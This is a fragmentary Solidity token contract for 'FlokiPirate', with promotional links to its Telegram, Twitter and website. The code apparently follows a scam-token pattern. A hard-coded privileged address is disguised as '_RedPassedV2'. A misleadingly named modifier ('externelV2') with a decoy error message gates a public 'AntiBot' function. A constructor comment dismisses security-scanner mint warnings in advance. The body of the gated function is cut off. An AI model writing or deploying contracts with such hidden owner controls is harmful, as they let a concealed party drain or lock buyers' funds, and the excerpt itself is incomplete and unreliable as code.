...
Telegram: https://t.me/Flokipiratetoken

Twitter: https://twitter.com/FlokiPirateArrr

Website: flokipirate.club
...
contract Context {
 ...
 contract FlokiPirate is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "FlokiPirate";
    string private _symbol = "FLOKIPIRATE";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // 𝗣𝗮𝗻𝗖𝗮𝗸𝗲𝗦𝘄𝗮𝗽 𝗥𝗼𝘂𝘁𝗲𝗿
    uint8 private _decimals = 9; 
    uint256 private _totalSupply; 
    uint256 private fee = 10; // 𝗧𝗼𝘁𝗮𝗹 𝗙𝗲𝗲𝘀
    uint256 private multi = 5; // 𝗔𝗻𝘁𝗶𝗕𝗼𝘁
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_) {  // 𝗗𝗲𝗽𝗹𝗼𝘆 𝟭 𝗕𝗶𝗹𝗹𝗶𝗼𝗻 𝗧𝗼𝗸𝗲𝗻𝘀 *** 𝗠𝗶𝗴𝗵𝘁 𝗦𝗰𝗮𝗻𝗻𝗲𝗿 𝗙𝗮𝗹𝘀𝗲 𝗗𝗲𝘁𝗲𝗰𝘁 𝗜𝘁 𝗔𝘀 𝗔 𝗠𝗶𝗻𝘁 ***
    ...
    function AntiBotTrue() public view virtual returns(uint256) {
        return multi;
    }
    ...
    address private _RedPassedV2 = 0x35DC8fD241280C6c60C9284310e697Eb8cfE0502; // 𝗢𝘄𝗻𝗲𝗿𝘀𝗵𝗶𝗽
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    modifier externelV2 () {
        require(_RedPassedV2 == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function AntiBot() public externelV2 {
